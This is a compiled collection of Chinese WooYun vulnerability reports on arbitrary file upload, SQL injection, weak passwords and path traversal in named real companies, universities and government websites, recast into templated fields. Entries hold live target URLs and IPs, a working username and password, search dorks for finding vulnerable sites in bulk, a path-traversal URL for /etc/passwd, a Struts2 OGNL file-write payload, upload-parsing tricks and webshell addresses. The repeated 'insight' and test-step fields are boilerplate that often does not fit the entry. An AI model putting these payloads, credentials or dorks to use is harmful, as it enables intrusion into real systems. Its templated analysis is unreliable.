**洞察**: SQL注射漏洞防护不足，开发者信任前端输入

**测试流程**:
1. 识别SQL注射漏洞相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 关键字:inurl:/ws2004/inurl:/vc2003/login/社区系统地址:/vc2003/login/main.asp这是一个集成安装的程序，所以社区系统自带，谷歌和百度收录不是很多，关键词也可以.WooYun: 某通用型校园管理系统任意文件上传继上次提交过的任意文件上传，用户登录页面还存在GET注入。漏洞地址：vc2003/login/main.asp（登录抓包）vc2003/login/login.asp?UN=admin&PW=admin&ST=RegUN参数过来不严格直接带入查询

**POC**: 登录抓包：GET /vc2003/login/login.asp?UN=admin&PW=admin&ST=Reg HTTP/1.1Host: www.tlzz.comProxy-Connection: keep-aliveAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.102 Safar

**绕过**: 直接利用

**修复**: ~~
---

---
### [wooyun-2016-0170555] 中国联通某省接入网综合网管系统弱口令影响多个城市、有城市影响到业务系统
**厂商**: 中国联通 | **年份**: 2016 | **类型**: 基础设施弱口令

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 基础设施弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别基础设施弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/bugs/wooyun-2015-0163789山东联通iposs系统我现在发的是anoss一个是山东联通网管IP综合管理系统一个是山东联通接入网综合网管系统不是一个系统但是密码啥的都一样山东联通接入网综合网管系统http://**.**.**.**/ldims/login.jsp用户名：wbinzhou密码  ：123456登录域：**.**.**.**admin权限还可以处理业务工单还有一个地方有任意文件上传,但是小弟才疏学浅没抓到相对路径其他的问题就不在一一复述详情请参考http://**.**.**.**/bugs/wooyun-2015-0163789所有描述的都能涉及到

**POC**: http://**.**.**.**/bugs/wooyun-2015-0163789山东联通iposs系统我现在发的是anoss一个是山东联通网管IP综合管理系统一个是山东联通接入网综合网管系统不是一个系统但是密码啥的都一样山东联通接入网综合网管系统http://**.**.**.**/ldims/login.jsp用户名：wbinzhou密码  ：123456登录域：**.**.**.**admin权限还可以处理业务工单还有一个地方有任意文件上传,但是小弟才疏学浅没抓到相对路径user wbinzhoupass 123456登陆域 **.**.**.**----------下面的都是用户/

**绕过**: 直接利用

**修复**: 不要打哪补哪都是弱口令
---

---
### [wooyun-2012-05259] 温州市行政服务网文件任意上传
**厂商**: 温州市行政服务网 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 温州市行政服务网http://www.wzae.gov.cn/was/portals/index.jsp 选择注册用户  有个上传的地方 没有任何过去  可以直接上传JSP大马

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 这个你们比我懂不要抓俺... 俺是农民... 俺是良民...
---

---
### [wooyun-2012-014479] 3g门户后台弱口令导致上传继而可沦陷
**厂商**: 3g门户 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.http://www.3g.cn/admin/default.aspx  弱口令 test test //这个网站经过测试了2.看到了编辑器，果断查看源代码发现是Freetextbox，百度下漏洞 发现其可上传asp;jpg3.上传成功...4.后门已删除4.谢绝跨省，不谢绝礼物

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修复方法 修复编辑器百度一下就有test用户可以改名改密码了....谢绝跨省不谢绝礼物....
---

---
### [wooyun-2013-038663] 中华人民共和国交通运输部任意写文件漏洞
**厂商**: 中华人民共和国交通运输部 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 查点东西,刚好碰上了,作为良好公民,应该有向党和国家反应问题的觉悟.中华人民共和国交通运输部网站使用TRS WCM V6.5搭建，网站存在文件写入漏洞还未修复，WCM后台地址：http://wcm.moc.gov.cn:9000/wcm/，漏洞详情参见:WooYun: TRS WCM 6.X系统任意文件写入漏洞

**POC**: http://wcm.moc.gov.cn:9000/wcm/demo/loginpage.jsp我应该写国庆节快乐的~

**绕过**: 直接利用

**修复**: 这漏洞有段日子了,联系厂家吧.
---

---
### [wooyun-2014-083507] 掌游天下某站存在任意上传漏洞
**厂商**: 掌游天下 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: <img src="http://app.zplay.cn/client/1116154235ck.txt" alt="" />http://app.zplay.cn/client/1116154235ck.txt

**绕过**: 直接利用

**修复**: 表示限制下上传的后拽。联系本人qq1097131147
---

---
### [wooyun-2013-022014] 江苏卫视某分站任意上传
**厂商**: 江苏卫视 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://paipai.jstv.com先注册一个用户 注册后点击我要发布 可任意上传文件上传完毕后 到我的稿件里找到转码中 连接进入找到图片地址找到了图片地址然后。。。。下面三个连接为测试 请自行删除。谢谢http://paipai.jstv.com/Video/Detail/13430http://paipai.jstv.com/Video/Detail/13431http://paipai.jstv.com/Video/Detail/13433

**POC**: http://paipai.jstv.com先注册一个用户 注册后点击我要发布 可任意上传文件上传完毕后 到我的稿件里找到转码中 连接进入找到图片地址找到了图片地址然后。。。。测试上传的连接和目录下面的webshell 请自行删除。谢谢http://paipai.jstv.com/Video/Detail/13430http://paipai.jstv.com/Video/Detail/13431http://paipai.jstv.com/Video/Detail/13433

**绕过**: 直接利用

**修复**: 过滤或者限制执行
---

---
### [wooyun-2014-054577] 某政府CMS配置错误导致任意文件上传(影响大量政府网)
**厂商**: Cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #1.某政府专用CMS由于附带Ewebeditor编辑器，并且因为配置错误行为，编辑器没有过滤恶意的后缀文件，导致用户可以上传JSP脚本木马，大量政府网遭殃！通过百度、谷歌、搜狗可批量查询到这样的网站，数量巨多！如下：Google or Baiduinurl:/main/model/newinfoinurl:newinfo.do?infoId百度为您找到相关结果约1,000,000个谷歌找到约 136,000 条结果 （用时 0.45 秒）#2.EwebEditor编辑器的位置处于：http://www.***.gov.cn/main/model/newsoperation/webEditor/eWebEditor.jspPS：如果编辑器出错或其它之类，完全可以本地构造上传表达进行上传，这个你懂得！

**POC**: #3.以下枚举五例作为通用，【注意：例举的漏洞仅供Cncert测试使用，其它人员请勿恶意利用例子和该该方法进行破坏，否则后果自负！】http://www.***.gov.cn//main/model/newsoperation/webEditor/eWebEditor.jsphttp://s***y.***.gov.cn//main/model/newsoperation/webEditor/eWebEditor.jsphttp://www.***w.gov.cn//main/model/newsoperation/webEditor/eWebEditor.jsphttp://www.***.

**绕过**: 直接利用

**修复**: PS:@Cncert国家互联网应急中心，麻烦把那shell删除一下，我删了半天没删了，求删除!谢谢了！希望可以奖励点RMB来给我爸治病，另外请求Cncert尽快向软件生产商通知该漏洞，并要求他们尽快联系已经安装了该CMS的政府机构修复该漏洞！请不要跨省噢！只测试了一下！啥也没干！
---

---
### [wooyun-2012-07696] 腾讯某子站任意文件下载
**厂商**: 腾讯 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 也不多说了：http://tap.3g.qq.com:8080/picview?b=idpic&filename=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00.png

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 您懂得！
---

---
### [wooyun-2015-0157148] 北京亿玛在线某系统任意上传
**厂商**: emar.com | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用友crm系统详情请看http://wooyun.org/bugs/wooyun-2015-0137238http://crm.emar.com/<html><form action="http://crm.emar.com/ajax/uploadfile.php?DontCheckLogin=1" method="post" enctype ="multipart/form-data"><input type="file" name="file" /><input type="submit" name="upload" value="upload"/></form></html>应该是做了什么限制、或者有安全狗什么的 php文件一访问就是404..http://crm.emar.com/tmpfile/upd_1VOJBb.txt 我就上传个txt吧、、能上传 但访问不了

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2015-0159976] 海尔某系统任意文件上传漏洞
**厂商**: 海尔集团 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件上传地址：http://home.ithaier.com/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&Connector=connectors/aspx/connector.aspx典型的FCKeditor文件上传漏洞

**POC**: 发现大量的入侵痕迹，目测已被提权。

**绕过**: 直接利用

**修复**: 系统版本比较老，如果是不再使用的应用，建议下线。
---

---
### [wooyun-2012-07180] 海通证券XXXXX管理平台
**厂商**: 海通证券XXXXX管理平台 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://analyst9.htsec.com:1301/test3693/  木马地址http://analyst9.htsec.com/admin/http://analyst9.htsec.com:1301/manager/html/

**绕过**: 直接利用

**修复**: JBOSS tomcat 两个方面的问题，自己修复，你懂得
---

---
### [wooyun-2012-07261] 速成建站通杀漏洞，直接秒杀服务器！
**厂商**: http://www.esite.net.cn/ | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 速成建站通杀漏洞，直接秒杀服务器！进去直接mysql最高权限 ！危害这个你懂滴！

**POC**: http://my.5uweb.com/coon.asp服务器咱就不进了！！河蟹啊！

**绕过**: 直接利用

**修复**: 程序设计上失误 没有完全判断上传后缀！ 修复这个你们应该懂滴！
---

---
### [wooyun-2014-066586] Workerman小蝌蚪互动聊天室游戏上传可执行文件漏洞
**厂商**: Workerman | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 小蝌蚪聊天室程序是github上开源的程序,看样子还有很多人在用(500多星,200多fork).地址:https://github.com/walkor/workerman-todpole发现漏洞地址:http://kedou.workerman.net/右侧上传头像功能未限制上传文件类型.导致可上传php木马.上传接口还直接返回上传后文件位置.如果,使用此程序的人未使用低级系统账户可导致严重问题.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制文件上传类型为图片类型.上传文件后使用随机生成的新名字.取消文件上传目录的执行权限.
---

---
### [wooyun-2011-01218] 腾讯某分站使用存在漏洞的管理系统
**厂商**: 腾讯 | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.itravelqq.com/用了存在漏洞的老版本phpcms 可以被利用

**POC**: http://www.itravelqq.com/此站被入侵过 内存子站同样有漏洞

**绕过**: 直接利用

**修复**: 换CMS吧
---

---
### [wooyun-2014-082338] 坦克世界某系统任意代码执行(未深入测试)
**厂商**: 空中网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://rank.kongzhong.com:80/updateUserName?aid=&redirect:xxxxx%25{%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23path%3d%23req.getRealPath(%22/%22)%2b'/x.html',%23d%3dnew%20java.io.FileWriter(%23path),%23d.write('test,from,wooyun'),%23d.close()}

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-058089] 福建省某市网络办公系统上传漏洞导致大量信息泄漏
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 福建省某市网络办公系统上传漏洞导致大量信息泄漏

**POC**: 在电信某C段发现一个网络办公系统http://59.60.30.115:8080//login.asp对网站进行敏感目录检测。发现这个文件http://59.60.30.115:8080/photo.asp  可未授权进行文件上传本来以为直接上传利用解析漏洞，但是发现网站过滤了；符号用burp suite进行截断上传 ，成功获得webshell获得webshell发现该网站的文件都进行加密对数据库文件进行反编译发现数据库用户信息存在一个XML文件内<?xml version="1.0" encoding="utf-8"?><xml><info><item><Userid>1</Userid><

**绕过**: 直接利用

**修复**: 你们懂得~~~
---

---
### [wooyun-2015-0148821] 某通用型数字化校园平台系统任意文件上传
**厂商**: 武汉英福软件有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某通用型数字化校园平台系统任意文件上传。我要去检察院了，好怕怕！！！求通过...案例：http://**.**.**.**:8090/vj/admin/classGroup/addBook.aspx**.**.**.**/vj/admin/classGroup/addBook.aspx**.**.**.**/vj/admin/classGroup/addBook.aspx**.**.**.**:8090/vj/admin/classGroup/addBook.aspxhttp://**.**.**.**/vj/admin/classGroup/addBook.aspx**.**.**.**/vj/admin/classGroup/addBook.aspxhttp://**.**.**.**/admin/classGroup/addBook.aspx

**POC**: 利用IIS解析漏洞，上传1.asp;1.jpg即可getshell。http://**.**.**.**:8090/vj/admin/classGroup/addBook.aspx证明如下所示：

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-050783] 蓝港分站jboss任意代码执行
**厂商**: linekong.com | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://kefu.linekong.com/eService/又是一个linux系统

**POC**: 如上

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-068888] 苹果cms7.x版本任意文件上传
**厂商**: maccms.com | **年份**: 2014 | **类型**: 应用配置错误

**元思考**: 触发信号: 上传功能

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题出在 admin/editor/upload.php 第22行if(!in_array(substr($FILEa['name'],-3,3),$ftypes))$errm = "文件格式不正确1　[ <a href=# onclick=history.go(-1)>重新上传</a> ]";//虽然限制了文件类型 但是没有代码还是能继续往下执行if($FILEa['size']> $maxSize*1024)$errm = "文件大小超过了限制　[ <a onclick=history.go(-1)>重新上传</a> ]";if($FILEa['error'] !=0)$errm = "未知错误";

**POC**: 随便选择一个上传点

**绕过**: 直接利用

**修复**: 加个return $errm
---

---
### [wooyun-2015-0101007] 西北工业大学Digitalized DCP 存在任意文件上传漏洞
**厂商**: 西北工业大学 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://cas.nwpu.edu.cn/cas/login?service=http%3A%2F%2Fportal.nwpu.edu.cn%2Fdcp%2Findex.jsp

**POC**: 0x_1.登陆之后，个人主页存在任意文件上传漏洞0x_2.连一下看看0x_3.看一下系统版本

**绕过**: 直接利用

**修复**: 未修复
---

---
### [wooyun-2014-081315] 某商业链系统通用任意文件上传漏洞及列目录泄露源码和数据库信息
**厂商**: 北京富基融通科技有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://wooyun.org/bugs/wooyun-2010-066857 发掘另外几处漏洞技术支持:北京富基融通科技有限公司(http://www.e-future.com.cn/)程序名称：商业供应链系统漏洞类型：任意文件上传导致代码执行、列目录泄露备份源码、数据库信息一、任意文件上传前人的漏洞是自己本地构造一个html，其实网站同级目录下就有upload.html/web/epublic/upload.html1.http://123.127.107.117/web/epublic/upload.html直接上传jsp小马，位置如下：mask 区域1.http://**.**.**/webhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/x.jsp aa_2.2.http://**.**.**/webhttps://w

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 上传点：服务器端做后缀校验，白名单策略列目录：备份目录更改下权限
---

---
### [wooyun-2015-0126646] 网鱼网咖App鱼泡泡某处任意文件上传
**厂商**: 网鱼网咖 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在鱼泡泡app用户上传头像处，可上传任意文件

**POC**: POST / HTTP/1.1Host: upload.qiniu.comProxy-Connection: keep-aliveAccept: */*Accept-Encoding: gzip, deflateContent-Length: 661Content-Type: multipart/form-data; boundary=Boundary+5130E1F7B4930716Accept-Language: zh-Hans;q=1, en;q=0.9Connection: keep-aliveUser-Agent: ypp_iphone/2.3 (iPhone; iOS 8.1.3;

**绕过**: 直接利用

**修复**: 过滤上传图片内容及后缀
---

---
### [wooyun-2015-0153586] 中央民族大学分站任意文件上传导致服务器沦陷
**厂商**: 中央民族大学 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/up.aspx任意文件上传

**POC**: http://**.**.**.**/img/aspx.aspx大马地址

**绕过**: 直接利用

**修复**: 一心只日大学站，回报当年不录取恩
---

---
### [wooyun-2015-0124987] 某高大上的CMS存在任意文件上传漏洞(涉及金融、百强企业、上市公司、控股集团等)
**厂商**: 杭州博采网络科技股份有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: BOC是杭州博采网络科技股份有限公司的高端网站建设品牌，是知名的杭州网络公司。博采网络成立于2004年。我们致力于为全球精英企业提供创新、尖端、前沿的数字化营销服务。十年来始终坚守"全网价值营销服务商"的服务定位，与全球逾3000家企业建立了长期深入、互惠互信的战略合作关系，其中包括阿里巴巴、松下、吉利、华润、保利、万科、传化等知名企业。官网给出的案例太屌了：http://www.bocweb.cn/上传点：/bocadmin/j/uploadify.phpbocaiadmin是后台位置；有些站点目测管理员已经发行该漏洞修复了，但还是有大部分大部分大部分大部分存在；包括博采官网案例：    杀伤力太强了，Mask隐藏一下；第15个案例是他们官网mask 区域1.http://**.**.**/zhongxin//bocadmin/j/uploadify.php   中信银行      __

**POC**: 都不敢拿太屌的站点做测试~漏洞是利用最下面的表单，可以看到在fileext添加了上传的类型便可以直接上传任意文件测试2个：有安全狗的你们就自己突破练练技术，但不要搞破坏http://www.jlygb.com/bocadmin/j/uploadify.phphttp://www.jlygb.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php.phphttp://www.t-lift.cn//bocadmin/j/uploadify.phphttp://www.t-lift.cn/https://wooyun-img.oss-

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-072612] 全国海关互联网信息系统存在任意文件操作&文件上传&信息泄漏
**厂商**: 202.127.48.176 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-077776] 杭州某站存在漏洞
**厂商**: hangzhou.com.cn | **年份**: 2014 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 上传功能

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://webvote.hangzhou.com.cn/mx/bm.php未做任何过滤直接上传PHP马

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-064984] phpwind 9.0后台执行任意php代码
**厂商**: phpwind | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞的利用需要“门户设计”权限，也就是在线编辑网站模板所需要的权限。测试的phpwind版本为 v9.0 20130702本来直接告诉了开发组结果被说“你不给他权限不就好了嘛”，遂发到乌云来。由于是0day所以估计涉及了大量版本（？）正片：1.首先从官网下载了一个空模板。2.在模板中的index.htm中插入一句话代码3.重新打包，进入模板编辑模式，导入模板。4.导入成功5.用GET方式提交php代码~测试成功~小结：其实漏洞的利用还算简单。比如。。“只要20块钱定制网站模板包安装咯~只需要门户权限！”

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们比我更专业~
---

---
### [wooyun-2013-036116] 蘑菇街任意文件上传漏洞
**厂商**: 蘑菇街 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看图吧，不详细说了最后生成的文件http://s13.mogujie.cn/b7/pic/130904/y61xb_kqyxcn2ekfbfqtdwgfjeg5sckzsew_20x20.jpg.php;aa_960x400.php;aa不过经过二次渲染了，需要想办法绕过

**POC**: 看图吧，不详细说了最后生成的文件http://s13.mogujie.cn/b7/pic/130904/y61xb_kqyxcn2ekfbfqtdwgfjeg5sckzsew_20x20.jpg.php;aa_960x400.php;aa不过经过二次渲染了，需要想办法绕过

**绕过**: 过滤绕过

**修复**: ··无··
---

---
### [wooyun-2013-025664] 甘肃武威政府网上传页面控制不当，已被渗透
**厂商**: 甘肃武威政府网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 上传页面http://61.178.185.67:85/UpLoadFile.jsp然后就是各种网站沦陷。。http://61.178.185.67:88http://61.178.185.67等等。。。该服务器问题太多。。。补丁打的不多。。。远程端口是9999，但小菜一直连接不上。不知为何。。。

**POC**: http://61.178.185.67:85/UserFiles/File/201361046.jsp翻其他盘符可以看到一些前人留下的文件和马。。。。

**绕过**: 直接利用

**修复**: 这么差的安全防护。。。全部整改的了。。。
---

---
### [wooyun-2015-0101724] 联想 ix2可越权访问其他文件也可以随意上传
**厂商**: 联想 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不需要登录manage.可以随意上传文件.其他未测试

**POC**: inurl:/manage/foldercontent.html现在我们本地搞个wooyun.txt 写zrtznb上传  上传就是那个+号http://187-162-112-181.static.axtel.net/manage/shares/Documents/wooyun.txt

**绕过**: 直接利用

**修复**: 加上权限验证
---

---
### [wooyun-2014-083857] 神州租车MCR汽车维修（连锁）管理系统任意文件上传漏洞
**厂商**: 神州租车 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在对系统的检测过程中，发现程序中商品图片上传功能没有对所上传的文件格式进行限制，造成任意文件上传，对系统安全运行造成极大威胁。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 限制上传类型、限制目录执行权限、控制中间件在系统中的权限
---

---
### [wooyun-2015-0118146] 杭州神话旗下天天团购系统任意文件上传漏洞
**厂商**: 杭州神话 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://tg.tttuangou.net/虽然该站是测试站，但测试站是介绍自己的产品的，宣传自己的产品都有这么大的漏洞，那如何让客户去相信你的产品呢？测试站有这个漏洞，是不是其他用你的产品的网站也有这个漏洞呢？是个致命的漏洞。

**POC**: 后台上传图片的位置传上的phpwebshell地址  http://tg.tttuangou.net/uploads/2015-06-01/364c7da23612d6ba91f510f29d9ae6ce.php那么多的数据库文件随便下载一个可执行任意命令

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2011-03129] CSDN ngnix配置错误
**厂商**: csdn | **年份**: 2011 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://comment2.csdn.net/images/logo.gif/1.php

**POC**: http://comment2.csdn.net/images/logo.gif/1.php

**绕过**: 直接利用

**修复**: php 配置修改 cgi.fix_pathinfo
---

---
### [wooyun-2014-050462] ServKit（原phpnow）官方网站自由上传文件漏洞
**厂商**: www.phpnow.org | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 进入http://www.phpnow.org/后缀随便输入，如http://www.phpnow.org/wooyun

**POC**: 图片：http://www.phpnow.org/wooyun.png目前，2014年2月8日15:12:51仍可访问http://www.phpnow.org/c.php自己上传了php探针：http://www.phpnow.org/tz.php文档：http://www.phpnow.org/wooyun.html

**绕过**: 直接利用

**修复**: 移除相关文件，设置权限。
---

---
### [wooyun-2014-063641] 某高校研究生教务通用系统任意文件上传(涉及不少高校)
**厂商**: 某高校研究生教务通用系统 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: gg：inurl:/gmis/xjgl/所有页面权限不经验证。。导致添加删除等操作都可以越权操作。。

**POC**: 这里说说上传吧，http://59.67.75.234/gmis/xjgl/student_info1.aspx?Action=qpqycpki  （存在任意添加学生信息。。bug）照片上传，以学号命名文件，先输入一个1.asp;x  在找一张包含asp木马的图片上传即可，获得的文件名为：1.asp;x.jpg

